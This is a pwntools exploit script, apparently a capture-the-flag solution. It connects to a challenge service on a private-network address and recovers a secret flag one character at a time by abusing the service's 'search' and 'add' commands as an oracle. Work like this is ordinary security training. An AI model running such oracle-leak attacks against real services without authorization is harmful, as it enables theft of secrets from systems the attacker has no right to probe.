#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 10.0.2.43 --port 10001 a.out
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('a.out')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '10.0.2.43'
port = int(args.PORT or 10001)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_{}"
flag = ""

io = start()

for c in alphabet:
    test = f"Yet another test entry here!{c}"
    print(test)
    io.sendlineafter(b":\n", b"search")
    io.sendlineafter(b"?\n", test.encode())
    res = io.recvuntil(b'found')
    print(res)
    if b'\nno' not in res:
        flag += c
        break

dummy = 0x30

while True:
    io.sendlineafter(b":\n", b"add")
    io.sendlineafter(b"?\n", chr(dummy).encode())
    for c in alphabet:
        test = f"{chr(dummy)}{c}"
        print(test)
        io.sendlineafter(b":\n", b"search")
        io.sendlineafter(b"?\n", test.encode())
        res = io.recvuntil(b'found')
        if b'\nno' not in res:
            flag += c
            dummy += 1
            print("flag:" + flag)
            print("dummy:" + str(dummy))
            print(io.recvuntil(b'\t').decode())
            break
    else:
        break

io.interactive()
